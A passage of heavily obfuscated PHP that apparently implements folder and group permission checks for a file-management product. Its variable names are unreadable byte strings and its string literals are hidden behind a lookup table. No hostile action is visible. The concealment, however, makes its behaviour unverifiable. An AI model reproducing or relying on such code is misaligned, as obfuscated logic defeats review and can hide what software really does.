Ì‡²ˆ[$íÀ„İÚ¼[506]][$íÀ„İÚ¼[506]], $íÀ„İÚ¼[2041])) { continue; } $›í¯© = array($íÀ„İÚ¼[42] => $íÀ„İÚ¼[1332] . $­…öäº[$íÀ„İÚ¼[42]], $íÀ„İÚ¼[202] => $­…öäº[$íÀ„İÚ¼[100]][$íÀ„İÚ¼[202]], $íÀ„İÚ¼[97] => KodIO::make($­…öäº[$íÀ„İÚ¼[100]][$íÀ„İÚ¼[202]]), $íÀ„İÚ¼[201] => $íÀ„İÚ¼[239], $íÀ„İÚ¼[199] => $íÀ„İÚ¼[598], $íÀ„İÚ¼[43] => $íÀ„İÚ¼[639], $íÀ„İÚ¼[602] => $­…öäº[$íÀ„İÚ¼[609]], $íÀ„İÚ¼[1429] => $­…öäº[$íÀ„İÚ¼[1429]], $íÀ„İÚ¼[606] => $­…öäº[$íÀ„İÚ¼[201]], $íÀ„İÚ¼[2227] => array($ÍœÜ÷ä¤)); $ÜÁ•¿ªÂ[$›í¯©[$íÀ„İÚ¼[202]]] = $›í¯©; } } $ı†§”§ğ = array(); $¤¹æßˆº = $this->getAllChildren($…ü‘û); foreach ($¤¹æßˆº as $‰ŞÑ¦ÂŞ) { $£øÍİÊø = !1; foreach ($‰ŞÑ¦ÂŞ[$íÀ„İÚ¼[2227]] as $ï ô¸‚») { if ($ï ô¸‚»[$íÀ„İÚ¼[1820]]) { if ($ï ô¸‚»[$íÀ„İÚ¼[1820]] == $ÒÑÚøË„) { $£øÍİÊø = !0; break; } } if ($ï ô¸‚»[$íÀ„İÚ¼[1429]]) { if ($this->groupContainUser($ï ô¸‚»[$íÀ„İÚ¼[1429]], $ÒÑÚøË„)) { $£øÍİÊø = !0; break; } } } if ($£øÍİÊø) { $ı†§”§ğ[] = $‰ŞÑ¦ÂŞ; } $¶¼èñ¹§ = $‰ŞÑ¦ÂŞ[$íÀ„İÚ¼[202]]; if (isset($ÜÁ•¿ªÂ[$¶¼èñ¹§])) { $‰ŞÑ¦ÂŞ[$íÀ„İÚ¼[2227]][] = $ÜÁ•¿ªÂ[$¶¼èñ¹§][0]; $ÜÁ•¿ªÂ[$¶¼èñ¹§] = !1; } } $ÜÁ•¿ªÂ = array_filter(array_values($ÜÁ•¿ªÂ)); $ı†§”§ğ = array_merge($ÜÁ•¿ªÂ, $ı†§”§ğ); return $ı†§”§ğ; } public function setAllChildrenByUser($ÔÆ™ì“ü, $¯Ğ·›É, $Á‡ú•Ì•) { $Ã×ÙÚø¸ =& $_SERVER[‰‰Ş‚€]; $ØˆÜıš = $this->getAllChildrenByUser($ÔÆ™ì“ü, $¯Ğ·›É); if (!$Á‡ú•Ì• || !$ØˆÜıš) { return !1; } foreach ($ØˆÜıš as $š¬ÑåÙ¸) { $Òäö¨öƒ = array(); foreach ($š¬ÑåÙ¸[$Ã×ÙÚø¸[2227]] as $ÌÄ„ø¹”) { $Âù“ëö‡ = $ÌÄ„ø¹”[$Ã×ÙÚø¸[560]]; $ç²³œµç = $ÌÄ„ø¹”[$Ã×ÙÚø¸[1820]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÈÑÆ‚ = $ÌÄ„ø¹”[$Ã×ÙÚø¸[1820]] ? $ÌÄ„ø¹”[$Ã×ÙÚø¸[1820]] : $ÌÄ„ø¹”[$Ã×ÙÚø¸[1429]]; if ($ÌÄ„ø¹”[$Ã×ÙÚø¸[1820]] && $ÌÄ„ø¹”[$Ã×ÙÚø¸[1820]] == $¯Ğ·›É) { continue; } $Òäö¨öƒ[] = array($Ã×ÙÚø¸[202] => $š¬ÑåÙ¸[$Ã×ÙÚø¸[202]], $Ã×ÙÚø¸[199] => $ç²³œµç, $Ã×ÙÚø¸[589] => intval($ÈÑÆ‚), $Ã×ÙÚø¸[2129] => isset($Âù“ëö‡[$Ã×ÙÚø¸[491]]) ? intval($Âù“ëö‡[$Ã×ÙÚø¸[491]]) : 0, $Ã×ÙÚø¸[2192] => isset($Âù“ëö‡[$Ã×ÙÚø¸[2192]]) ? intval($Âù“ëö‡[$Ã×ÙÚø¸[2192]]) : -1); } $Òäö¨öƒ[] = array($Ã×ÙÚø¸[202] => $š¬ÑåÙ¸[$Ã×ÙÚø¸[202]], $Ã×ÙÚø¸[199] => SourceModel::TYPE_USER, $Ã×ÙÚø¸[589] => intval($¯Ğ·›É), $Ã×ÙÚø¸[2129] => intval($Á‡ú•Ì•), $Ã×ÙÚø¸[2192] => -1); $this->where(array($Ã×ÙÚø¸[510] => $š¬ÑåÙ¸[$Ã×ÙÚø¸[202]]))->delete(); $this->addAll($Òäö¨öƒ); } return !0; } public function get($³‚Ù¢§) { $ÛüïÁòŒ = $this->getSourceList(array($³‚Ù¢§), !0); return $ÛüïÁòŒ[0]; } public function getSourceList($â¦°¸Ãğ, $šï ¸±à = false, $äÎßÖÑÇ = false) { $ö”†»ğ¨ =& $_SERVER[‰‰Ş‚€]; if (!$â¦°¸Ãğ) { return array(); } $íİä–¶ = Model($ö”†»ğ¨[1467]); if (!$šï ¸±à && count($â¦°¸Ãğ) == 1) { $šï ¸±à = array(); $šï ¸±à[$â¦°¸Ãğ[0]] = $íİä–¶->sourceInfo($â¦°¸Ãğ[0]); } if (!$šï ¸±à) { $³°‚Æ«° = array($ö”†»ğ¨[510] => array($ö”†»ğ¨[511], $â¦°¸Ãğ)); $šï ¸±à = $íİä–¶->field($ö”†»ğ¨[2232])->where($³°‚Æ«°)->select(); $šï ¸±à = array_to_keyvalue($šï ¸±à, $ö”†»ğ¨[202]); } $’æãş = $â¦°¸Ãğ; foreach ($šï ¸±à as $Æ¸Úæ˜ => $¶ı‡¾Ÿ¯) { $Ó‰‡íÙ = $íİä–¶->parentLevelArray($¶ı‡¾Ÿ¯[$ö”†»ğ¨[604]]); $’æãş = array_merge($’æãş, array(intval($Æ¸Úæ˜)), array_reverse($Ó‰‡íÙ)); } $’æãş = array_values(array_unique($’æãş)); if (!$’æãş) { return array(); } $ÃĞî™Ãï = $this->sourceAuthSelect($’æãş); $·ÉıÚ®ù = array(); foreach ($’æãş as $öš¨°¼×) { if (isset($ÃĞî™Ãï[$öš¨°¼×])) { $·ÉıÚ®ù[$öš¨°¼×] = $ÃĞî™Ãï[$öš¨°¼×]; } } $Í¦È÷ß¶ = $this->userIsRoot($äÎßÖÑÇ); $Ï‡ôçİÊ = AuthModel::authAll(); $æ«†ÖÇÊ = array($ö”†»ğ¨[507] => $Ï‡ôçİÊ, $ö”†»ğ¨[2233] => array($ö”†»ğ¨[512] => 0, $ö”†»ğ¨[2026] => $Ï‡ôçİÊ, $ö”†»ğ¨[513] => LNG($ö”†»ğ¨[2214]), $ö”†»ğ¨[2043] => $ö”†»ğ¨[2215])); $ğÉ—ÙŸÈ = array(); foreach ($šï ¸±à as $öš¨°¼× => $íºÙË›ç) { if ($Í¦È÷ß¶ && $GLOBALS[$ö”†»ğ¨[16]][$ö”†»ğ¨[2039]]) { $ğÉ—ÙŸÈ[$öš¨°¼×] = $æ«†ÖÇÊ; continue; } $ğÉ—ÙŸÈ[$öš¨°¼×] = $this->makeSourceAuth($íºÙË›ç, $·ÉıÚ®ù, $äÎßÖÑÇ); } return $ğÉ—ÙŸÈ; } public function authDeepCheck($¥Èğ€ç±, $Ë¤ÁÏ„ = false) { $™úÁêôÌ =& $_SERVER[‰‰Ş‚€]; $Ë¤ÁÏ„ = $Ë¤ÁÏ„ ? $Ë¤ÁÏ„ : USER_ID; $ÏãÇ¼æ = $this->makeAuthDeep($Ë¤ÁÏ„); if (!in_array($¥Èğ€ç±, $ÏãÇ¼æ[$™úÁêôÌ[2234]])) { return !1; } $†é‰Ñî = array(); foreach ($ÏãÇ¼æ[$™úÁêôÌ[2235]] as $”ñ’ï¢· => $Œ·ş©¿Â) { if (!in_array($¥Èğ€ç±, $Œ·ş©¿Â)) { continue; } $†é‰Ñî[] = $”ñ’ï¢·; } if (!$†é‰Ñî) { return !1; } $¢…”÷á = $†é‰Ñî ? $†é‰Ñî[0] : $¥Èğ€ç±; return array($™úÁêôÌ[507] => -1, $™úÁêôÌ[560] => array($™úÁêôÌ[512] => $™úÁêôÌ[1312], $™úÁêôÌ[2026] => $™úÁêôÌ[239], $™úÁêôÌ[513] => LNG($™úÁêôÌ[2236]), $™úÁêôÌ[2043] => $™úÁêôÌ[2237]), $™úÁêôÌ[2225] => LNG($™úÁêôÌ[2238]), $™úÁêôÌ[2239] => $this->sourceAuthInfo($¢…”÷á)); } protected function makeAuthDeep($…—è¢Œï = false) { $û×Ê‹§ñ =& $_SERVER[‰‰Ş‚€]; static $ß¥¼ÓÂ = array(); $…—è¢Œï = $…—è¢Œï ? $…—è¢Œï : USER_ID; if (isset($ß¥¼ÓÂ[$…—è¢Œï])) { return $ß¥¼ÓÂ[$…—è¢Œï]; } $¿¬ÇÚ®¼ = Model($û×Ê‹§ñ[2240])->listData(); $àİş’‘¶ = array(); foreach ($¿¬ÇÚ®¼ as $œâäø‹á) { if ($œâäø‹á[$û×Ê‹§ñ[506]] == 0 && $œâäø‹á[$û×Ê‹§ñ[2042]] == $û×Ê‹§ñ[101]) { $àİş’‘¶[] = $œâäø‹á[$û×Ê‹§ñ[491]]; } } $›ƒ“½ï§ = $this->userGroupParents($…—è¢Œï); $Ëˆùãâ° = array($û×Ê‹§ñ[199] => SourceModel::TYPE_USER, $û×Ê‹§ñ[589] => $…—è¢Œï); if ($›ƒ“½ï§) { $Ëˆùãâ° = array(array($û×Ê‹§ñ[199] => SourceModel::TYPE_USER, $û×Ê‹§ñ[589] => $…—è¢Œï), array($û×Ê‹§ñ[199] => SourceModel::TYPE_GROUP, $û×Ê‹§ñ[589] => array($û×Ê‹§ñ[511], $›ƒ“½ï§)), $û×Ê‹§ñ[1110] => $û×Ê‹§ñ[2123]); } $‡¬†ÔÛ¯ = $this->field($û×Ê‹§ñ[2241])->where($Ëˆùãâ°)->select(); $ˆ¯òÒ¤ƒ = array(); $ æÍü„ş = array_to_keyvalue_group($‡¬†ÔÛ¯, $û×Ê‹§ñ[202]); foreach ($ æÍü„ş as $îÍ€ÎÊ‡ => $¥Ô»İúì) { $¶æäğœû = $this->authArrayCheck($¥Ô»İúì, $…—è¢Œï); if ($¶æäğœû[$û×Ê‹§ñ[507]] > 0) { $ˆ¯òÒ¤ƒ[] = $îÍ€ÎÊ‡ . $û×Ê‹§ñ[22]; } } if ($›ƒ“½ï§) { $ê‰êºÓº = Model($û×Ê‹§ñ[605]); foreach ($›ƒ“½ï§ as $â¤˜ª¢š) { $ÇÖ—šäŠ = $ê‰êºÓº->getInfo($â¤˜ª¢š); if (!$ÇÖ—šäŠ || !is_array($ÇÖ—šäŠ[$û×Ê‹§ñ[100]])) { continue; } $ˆ¯òÒ¤ƒ[] = $ÇÖ—šäŠ[$û×Ê‹§ñ[100]][$û×Ê‹§ñ[202]]; } } $ÑÙäÕÇè = array(); $‰ÊÖƒş× = $›ƒ“½ï§; $é÷ˆ±º = Model($û×Ê‹§ñ[1467]); $ê‰êºÓº = Model($û×Ê‹§ñ[605]); $Óê±Ä»Ù = array(); $â…ú·Àê = array(); $ŸËµ·œ³ = array(); $‚æŒÛø = array(); if ($ˆ¯òÒ¤ƒ) { $İŠŸú·˜ = $é÷ˆ±º->where(array($û×Ê‹§ñ[202] => array($û×Ê‹§ñ[511], $ˆ¯òÒ¤ƒ)))->select(); foreach ($İŠŸú·˜ as $¼–úš¯†) { if ($¼–úš¯†[$û×Ê‹§ñ[524]] == $û×Ê‹§ñ[101]) { continue; } $‰Ö¤Åü = $é÷ˆ±º->parentLevelArray($¼–úš¯†[$û×Ê‹§ñ[604]]); $ÑÙäÕÇè = array_merge($ÑÙäÕÇè, $‰Ö¤Åü); $‰ÊÖƒş×[] = $¼–úš¯†[$û×Ê‹§ñ[589]]; $Óê±Ä»Ù[$¼–úš¯†[$û×Ê‹§ñ[202]]] = $‰Ö¤Åü; $â…ú·Àê[$¼–úš¯†[$û×Ê‹§ñ[202]]] = $¼–úš¯†[$û×Ê‹§ñ[589]]; } } $‰ÊÖƒş× = array_values(array_unique($‰ÊÖƒş×)); $™İëºĞ— = $‰ÊÖƒş×; foreach ($™İëºĞ— as $â¤˜ª¢š) { $ÇÖ—šäŠ = $ê‰êºÓº->getInfo($â¤˜ª¢š); $‰Ö¤Åü = $é÷ˆ±º->parentLevelArray($ÇÖ—šäŠ[$û×Ê‹§ñ[604]]); $‰ÊÖƒş× = array_merge($‰ÊÖƒş×, $‰Ö¤Åü); } $‰ÊÖƒş× = array_values(array_unique($‰ÊÖƒş×)); foreach ($‰ÊÖƒş× as $â¤˜ª¢š) { $ÇÖ—šäŠ = $ê‰êºÓº->getInfo($â¤˜ª¢š); $ÑÙäÕÇè[] = $ÇÖ—šäŠ[$û×Ê‹§ñ[100]][$û×Ê‹§ñ[202]]; $ŸËµ·œ³[$â¤˜ª¢š] = $ÇÖ—šäŠ[$û×Ê‹§ñ[100]][$û×Ê‹§ñ[202]]; $‚æŒÛø[$â¤˜ª¢š] = $é÷ˆ±º->parentLevelArray($ÇÖ—šäŠ[$û×Ê‹§ñ[604]]); } foreach ($Óê±Ä»Ù as $÷°—½×² => $ŒÄ¤Ô²³) { $èìÎáÈ = $â…ú·Àê[$÷°—½×²]; if (!$èìÎáÈ || !$ŸËµ·œ³[$èìÎáÈ]) { continue; } $ÀÌàµ˜ = array(); foreach ($‚æŒÛø[$èìÎáÈ] as $â¤˜ª¢š) { $ÀÌàµ˜[] = $ŸËµ·œ³[$â¤˜ª¢š]; } $Óê±Ä»Ù[$÷°—½×²] = array_merge($ÀÌàµ˜, $ŒÄ¤Ô²³); } $ÑÙäÕÇè = array_values(array_unique($ÑÙäÕÇè)); $÷é‘Æ™ = array($û×Ê‹§ñ[2234] => $ÑÙäÕÇè, $û×Ê‹§ñ[2235] => $Óê±Ä»Ù); $ß¥¼ÓÂ[$…—è¢Œï] = $÷é‘Æ™; return $÷é‘Æ™; } private function makeSourceAuth($ûú «šü, $Ä Ü³†ƒ, $»™²ğÖ½ = false) { $Ğ¯ù©À =& $_SERVER[‰‰Ş‚€]; $›ø‰¿Ö = $Ğ¯ù©À[101]; $Ø‹Ã€Œß = $ûú «šü[$Ğ¯ù©À[589]]; $ê ”Şßï = $ûú «šü[$Ğ¯ù©À[199]] == SourceModel::TYPE_GROUP; $ìúŠ½øß = $ê ”Şßï ? $this->groupRootAuth($Ø‹Ã€Œß, $»™²ğÖ½) : !1; if ($ìúŠ½øß && Model($Ğ¯ù©À[591])->authCheckAction($ìúŠ½øß[$Ğ¯ù©À[506]], $Ğ¯ù©À[2041])) { return $this->groupAuthInfo($ìúŠ½øß, $Ø‹Ã€Œß); } $ÓŒÜû = Model($Ğ¯ù©À[1467])->parentLevelArray($ûú «šü[$Ğ¯ù©À[604]]); $ÓŒÜû = array_merge(array($ûú «šü[$Ğ¯ù©À[202]]), array_reverse($ÓŒÜû)); $åÅÄÂ»¿ = !1; foreach ($ÓŒÜû as $ú¤©İ‚Ù) { if (!isset($Ä Ü³†ƒ[$ú¤©İ‚Ù])) { continue; } $ˆ”¢ù‰ = $this->authMake($Ä Ü³†ƒ[$ú¤©İ‚Ù], $»™²ğÖ½); if ($ˆ”¢ù‰[$Ğ¯ù©À[560]]) { $åÅÄÂ»¿ = $ˆ”¢ù‰; break; } } if (!$ê ”Şßï) { return $åÅÄÂ»¿; } if (!$åÅÄÂ»¿ && $ìúŠ½øß) { $åÅÄÂ»¿ = $this->groupAuthInfo($ìúŠ½øß, $Ø‹Ã€Œß); } if (!$åÅÄÂ»¿) { $¿±û¬ø¼ = Model($Ğ¯ù©À[605])->getInfo($Ø‹Ã€Œß); $áÍ‚²™¥ = explode($Ğ¯ù©À[60], trim($¿±û¬ø¼[$Ğ¯ù©À[604]], $Ğ¯ù©À[60])); $áÍ‚²™¥ = array_reverse($áÍ‚²™¥); foreach ($áÍ‚²™¥ as $†ı¥Æ»ì) { if ($†ı¥Æ»ì == $Ğ¯ù©À[239] || $†ı¥Æ»ì == $›ø‰¿Ö) { continue; } $”Ù¿úœõ = $this->groupRootAuth($†ı¥Æ»ì, $»™²ğÖ½); if (!$”Ù¿úœõ) { continue; } $åÅÄÂ»¿ = $this->groupAuthInfo($”Ù¿úœõ, $†ı¥Æ»ì); break; } } if (!$åÅÄÂ»¿ || $åÅÄÂ»¿[$Ğ¯ù©À[507]] <= 0) { $êÛÊ¦Ø» = $this->authDeepCheck($ûú «šü[$Ğ¯ù©À[202]], $»™²ğÖ½); if ($êÛÊ¦Ø») { $åÅÄÂ»¿ = $êÛÊ¦Ø»; } } return $åÅÄÂ»¿; } private function userIsRoot($–¯„÷‹¨ = false) { $Šøğ€­ =& $_SERVER[‰‰Ş‚€]; if (!$–¯„÷‹¨ && KodUser::isRoot()) { return !0; } $ºÖûËƒ¬ = Model($Šøğ€­[617])->getInfo($–¯„÷‹¨); $òÃ«Õ» = Model($Šøğ€­[2218])->listData($ºÖûËƒ¬[$Šøğ€­[2219]]); if ($òÃ«Õ» && $òÃ«Õ»[$Šøğ€­[595]][$Šøğ€­[2222]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ì´±áñÌ) { $û¾ñˆê¬ =& $_SERVER[‰‰Ş‚€]; $„Š€•ó· = Model($û¾ñˆê¬[1467]); $å‰¹¤Ê = $„Š€•ó·->sourceInfo($Ì´±áñÌ); if (!$å‰¹¤Ê) { return !1; } $„Š€•ó·->groupPathDisplay($å‰¹¤Ê); $ô³’Ö  = array($å‰¹¤Ê); $ô³’Ö  = $„Š€•ó·->_listAppendPath($ô³’Ö , !1); $å‰¹¤Ê = $ô³’Ö [0]; $²à”é = $å‰¹¤Ê[$û¾ñˆê¬[602]]; if (isset($å‰¹¤Ê[$û¾ñˆê¬[610]])) { $Ô±ÆÇÎ± = explode($û¾ñˆê¬[18], trim($å‰¹¤Ê[$û¾ñˆê¬[602]], $û¾ñˆê¬[18])); array_shift($Ô±ÆÇÎ±); $²à”é = $å‰¹¤Ê[$û¾ñˆê¬[608]] . $û¾ñˆê¬[2242] . implode($û¾ñˆê¬[18], $Ô±ÆÇÎ±); } return array($û¾ñˆê¬[42] => $å‰¹¤Ê[$û¾ñˆê¬[42]], $û¾ñˆê¬[202] => $å‰¹¤Ê[$û¾ñˆê¬[202]], $û¾ñˆê¬[97] => KodIO::make($å‰¹¤Ê[$û¾ñˆê¬[202]]), $û¾ñˆê¬[602] => $²à”é); } private function groupAuthInfo($æÒÎ£œÕ, $¼Ú¬´ĞÖ) { $şø–…·ü =& $_SERVER[‰‰Ş‚€]; $ƒÅºôÔ = Model($şø–…·ü[605])->getInfo($¼Ú¬´ĞÖ); return array($şø–…·ü[2243] => intval($æÒÎ£œÕ[$şø–…·ü[506]]), $şø–…·ü[2233] => $æÒÎ£œÕ, $şø–…·ü[2244] => LNG($şø–…·ü[2245]), $şø–…·ü[2239] => array($şø–…·ü[513] => $ƒÅºôÔ[$şø–…·ü[42]], $şø–…·ü[97] => KodIO::make($ƒÅºôÔ[$şø–…·ü[100]][$şø–…·ü[202]]), $şø–…·ü[2246] => $ƒÅºôÔ[$şø–…·ü[609]])); } protected function groupRootAuth($÷â—Åë·, $†çÌç÷® = false) { $®âñìî• =& $_SERVER[‰‰Ş‚€]; $†çÌç÷® = $†çÌç÷® ? $†çÌç÷® : USER_ID; $ß«ìó¤Ñ = $†çÌç÷® . $®âñìî•[2247] . $÷â—Åë·; static $¬í¥¢Úò = array(); if (isset($¬í¥¢Úò[$ß«ìó¤Ñ])) { return $¬í¥¢Úò[$ß«ìó¤Ñ]; } $úöôè‡„ = Model($®âñìî•[605])->getInfo($÷â—Åë·); $è’¿ë«ø = $this->userGroupList($†çÌç÷®); $Î­±§üë = isset($è’¿ë«ø[$÷â—Åë·]) ? $è’¿ë«ø[$÷â—Åë·][$®âñìî•[506]] : !1; if ($Î­±§üë && Model($®âñìî•[591])->authCheckAction($Î­±§üë[$®âñìî•[506]], $®âñìî•[2041])) { $¬í¥¢Úò[$ß«ìó¤Ñ] = $Î­±§üë; return $Î­±§üë; } $ÕØì¿·š = $this->sourceAuthSelect($úöôè‡„[$®âñìî•[100]][$®âñìî•[202]]); $Î¶’îÛ­ = $ÕØì¿·š ? $this->authMake($ÕØì¿·š, $†çÌç÷®) : !1; $®ÙĞ¯¹ß = $Î¶’îÛ­ ? $Î¶’îÛ­[$®âñìî•[560]] : !1; $¬í¥¢Úò[$ß«ìó¤Ñ] = $®ÙĞ¯¹ß ? $®ÙĞ¯¹ß : $Î­±§üë; return $¬í¥¢Úò[$ß«ìó¤Ñ]; } public function authOwnerApply($°š¦ˆÓ³) { $æ¹Í±í =& $_SERVER[‰‰Ş‚€]; if (empty($°š¦ˆÓ³[$æ¹Í±í[506]]) || isset($°š¦ˆÓ³[$æ¹Í±í[2248]]) && $°š¦ˆÓ³[$æ¹Í±í[2248]]) { return $°š¦ˆÓ³; } if (AuthModel::authCheckRoot($°š¦ˆÓ³[$æ¹Í±í[506]][$æ¹Í±í[507]])) { return $°š¦ˆÓ³; } $¸Âè¾¹é = Model($æ¹Í±í[1467])->parentLevelArray($°š¦ˆÓ³[$æ¹Í±í[604]]); $¸Âè¾¹é = array_merge(array($°š¦ˆÓ³[$æ¹Í±í[202]]), array_reverse($¸Âè¾¹é)); $òĞåá“Ä = $this->sourceAuthSelect($¸Âè¾¹é); $¶ò‹û¿‘ = array(); $Ù÷†ú¨’ = array(); foreach ($òĞåá“Ä as $ßÇğöï¡ => $ú²¸Ô· ) { $š È‡Òò = $this->authFolderOwnerUser($ú²¸Ô· ); $¶ò‹û¿‘[$ßÇğöï¡] = $š È‡Òò; $Ù÷†ú¨’ = array_merge($Ù÷†ú¨’, $š È‡Òò[$æ¹Í±í[685]]); if ($š È‡Òò[$æ¹Í±í[2249]]) { break; } } if (count($Ù÷†ú¨’) == 0) { $Ù÷†ú¨’ = $this->authFolderOwnerGroup($°š¦ˆÓ³[$æ¹Í±í[589]]); } $Ù÷†ú¨’ = array_unique($Ù÷†ú¨’); if (AuthModel::authCheckRoot($°š¦ˆÓ³[$æ¹Í±í[506]][$æ¹Í±í[507]])) { $Ù÷†ú¨’[] = USER_ID; } $°š¦ˆÓ³[$æ¹Í±í[506]][$æ¹Í±í[2250]] = Model($æ¹Í±í[597])->userListInfo($Ù÷†ú¨’); return $°š¦ˆÓ³; } private function authFolderOwnerGroup($Êè˜²Ïã) { $Ñı‚Ö¶ =& $_SERVER[‰‰Ş‚€]; $Ô¢Ú³ú = Model($Ñı‚Ö¶[2115])->where(array($Ñı‚Ö¶[1429] => $Êè˜²Ïã))->select(); $£Ë“Ø … = array(); if (!$Ô¢Ú³ú) { return $£Ë“Ø …; } foreach ($Ô¢Ú³ú as $ÎĞê«Üë) { $³ŞØå«š = $this->authInfo($ÎĞê«Üë); if (AuthModel::authCheckRoot($³ŞØå«š[$Ñı‚Ö¶[506]])) { $£Ë“Ø …[] = $ÎĞê«Üë[$Ñı‚Ö¶[1820]]; } } return $£Ë“Ø …; } private function authFolderOwnerUser($ˆ°“¬ÉÈ) { $Çä„¶ôï =& $_SERVER[‰‰Ş‚€]; $½Ëµ¨Á = array(); $øèÈø¦§ = !1; foreach ($ˆ°“¬ÉÈ as $È§ÈĞÍ¹) { $ß±òşÏÎ = $this->authInfo($È§ÈĞÍ¹); if ($È§ÈĞÍ¹[$Çä„¶ôï[589]] == $Çä„¶ôï[239]) { $øèÈø¦§ = !0; } if ($È§ÈĞÍ¹[$Çä„¶ôï[199]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ß±òşÏÎ[$Çä„¶ôï[506]])) { $½Ëµ¨Á[] = $È§ÈĞÍ¹[$Çä„¶ôï[589]]; } } } return array($Çä„¶ôï[685] => $½Ëµ¨Á, $Çä„¶ôï[2249] => $øèÈø¦§); } public function authMake($Ğ„ò¶Ô™, $§îë­¾ë = false) { $½•¶‘¥¢ =& $_SERVER[‰‰Ş‚€]; $ĞÆüœâı = $this->authArrayCheck($Ğ„ò¶Ô™, $§îë­¾ë); if ($ĞÆüœâı[$½•¶‘¥¢[2229]]) { $ĞÆüœâı[$½•¶‘¥¢[2229]] = $this->sourceAuthInfo($ĞÆüœâı[$½•¶‘¥¢[2229]]); } return $ĞÆüœâı; } public function authArrayCheck($÷ŒºÃÏï, $¿»™Ñ¬ = false) { $å óéÒŞ =& $_SERVER[‰‰Ş‚€]; if (!$÷ŒºÃÏï) { return array($å óéÒŞ[507] => 0, $å óéÒŞ[560] => !1, $å óéÒŞ[2244] => $å óéÒŞ[22]); } $¿»™Ñ¬ = $¿»™Ñ¬ ? $¿»™Ñ¬ : USER_ID; $ˆ ƒŠÏù = 0; $ô‘É¹Ìõ = 0; $‡üˆô¤Ñ = 0; $Ê°šÇúÖ = 0; $ôÎ±âµã = 0; $ƒ¡˜¾§ = 0; $î«•¦ˆÇ = 0; $øıÊ¥¤° = 0; $±ò˜îĞ¼ = 1000; $ÛäÖşÖ£ = 0; $¾ˆ±ö€ = 0; $ÁúÙÅÆ = 0; $ìÔ‰ˆ­å = 0; $ïÍšşƒ± = 0; foreach ($÷ŒºÃÏï as $âøóÎº) { $½Ì¹êõÏ = $this->authInfo($âøóÎº); if (!$½Ì¹êõÏ) { continue; } $ä½ìÙÎˆ = $âøóÎº[$å óéÒŞ[589]]; $²†æ‹êì = $âøóÎº[$å óéÒŞ[202]]; $³Ÿº¢¥µ = intval($½Ì¹êõÏ[$å óéÒŞ[506]]); if ($âøóÎº[$å óéÒŞ[199]] == SourceModel::TYPE_USER && $ä½ìÙÎˆ == $¿»™Ñ¬) { $ˆ ƒŠÏù = !0; $‡üˆô¤Ñ = $½Ì¹êõÏ; $ô‘É¹Ìõ = $³Ÿº¢¥µ; $Ê°šÇúÖ = $²†æ‹êì; } else { if ($âøóÎº[$å óéÒŞ[199]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ä½ìÙÎˆ, $¿»™Ñ¬)) { $ôÎ±âµã = !0; $™óûÜ„¤ = $this->groupStepToUserGroup($ä½ìÙÎˆ, $¿»™Ñ¬); if ($™óûÜ„¤ < $±ò˜îĞ¼) { $±ò˜îĞ¼ = $™óûÜ„¤; $ƒ¡˜¾§ = $³Ÿº¢¥µ; $î«•¦ˆÇ = $½Ì¹êõÏ; $ÛäÖşÖ£ = $ä½ìÙÎˆ; $øıÊ¥¤° = $²†æ‹êì; } if ($™óûÜ„¤ == $±ò˜îĞ¼ && $³Ÿº¢¥µ >= $ƒ¡˜¾§) { $ƒ¡˜¾§ = $³Ÿº¢¥µ; $î«•¦ˆÇ = $½Ì¹êõÏ; $ÛäÖşÖ£ = $ä½ìÙÎˆ; $øıÊ¥¤° = $²†æ‹êì; } } else { if (!$ä½ìÙÎˆ || $ä½ìÙÎˆ == $å óéÒŞ[239]) { $¾ˆ±ö€ = !0; $ìÔ‰ˆ­å = $½Ì¹êõÏ; $ÁúÙÅÆ = $³Ÿº¢¥µ; $ïÍšşƒ± = $²†æ‹êì; } } } } if ($ˆ ƒŠÏù) { $›Àî¶ûş = $ô‘É¹Ìõ; $½Ì¹êõÏ = $‡üˆô¤Ñ; $œ¬„ÃŒ€ = $Ê°šÇúÖ; $ìÛÑÌ‹‹ = LNG($å óéÒŞ[2251]); } else { if ($ôÎ±âµã) { $›Àî¶ûş = $ƒ¡˜¾§; $½Ì¹êõÏ = $î«•¦ˆÇ; $œ¬„ÃŒ€ = $øıÊ¥¤°; $–£Ä‘ = Model($å óéÒŞ[605])->getInfo($ÛäÖşÖ£); $ìÛÑÌ‹‹ = $å óéÒŞ[184] . $–£Ä‘[$å óéÒŞ[609]] . $å óéÒŞ[2252] . LNG($å óéÒŞ[2253]); } else { if ($¾ˆ±ö€) { $›Àî¶ûş = $ÁúÙÅÆ; $½Ì¹êõÏ = $ìÔ‰ˆ­å; $œ¬„ÃŒ€ = $ïÍšşƒ±; $ìÛÑÌ‹‹ = LNG($å óéÒŞ[2231]); } else { $›Àî¶ûş = 0; $½Ì¹êõÏ = !1; $ìÛÑÌ‹‹ = $å óéÒŞ[22]; $œ¬„ÃŒ€ = $å óéÒŞ[22]; } } } $òÓÀ¤©ı = array($å óéÒŞ[2243] => intval($›Àî¶ûş), $å óéÒŞ[2233] => $½Ì¹êõÏ, $å óéÒŞ[2244] => $ìÛÑÌ‹‹, $å óéÒŞ[2239] => $œ¬„ÃŒ€); return $òÓÀ¤©ı; } private function groupContainUser($æşœå², $¿ó¥‘‡˜ = false) { return in_array($æşœå², $this->userGroupParents($¿ó¥‘‡˜)); } private function groupStepToUserGroup($Û›´ü×À, $ÂÑñøò = false) { $îÎã±µÁ =& $_SERVER[‰‰Ş‚€]; $ëøğÛ—Â = $this->userGroupList($ÂÑñøò); $Ş½šı‘é = 1000; $†Åœ’Å = $GLOBALS[$îÎã±µÁ[16]][$îÎã±µÁ[102]][$îÎã±µÁ[2128]] == 1; $‹ë¦¬ë´ = $†Åœ’Å ? 3 : 2; foreach ($ëøğÛ—Â as $úº—»¬ğ) { if ($úº—»¬ğ[$îÎã±µÁ[1429]] == $Û›´ü×À) { return 0; } $µ¾üêŞ‘ = explode($îÎã±µÁ[60], trim($úº—»¬ğ[$îÎã±µÁ[604]], $îÎã±µÁ[60])); if ($µ¾üêŞ‘[0] == $îÎã±µÁ[239] && count($µ¾üêŞ‘) > $‹ë¦¬ë´) { $™üÍœ  = array_reverse(array_slice($µ¾üêŞ‘, $‹ë¦¬ë´)); $ÄÎèÁ©Ñ = array_search($Û›´ü×À, $™üÍœ ); if ($ÄÎèÁ©Ñ !== !1 && $ÄÎèÁ©Ñ + 1 <= $Ş½šı‘é) { $Ş½šı‘é = $ÄÎèÁ©Ñ + 1; } } } return 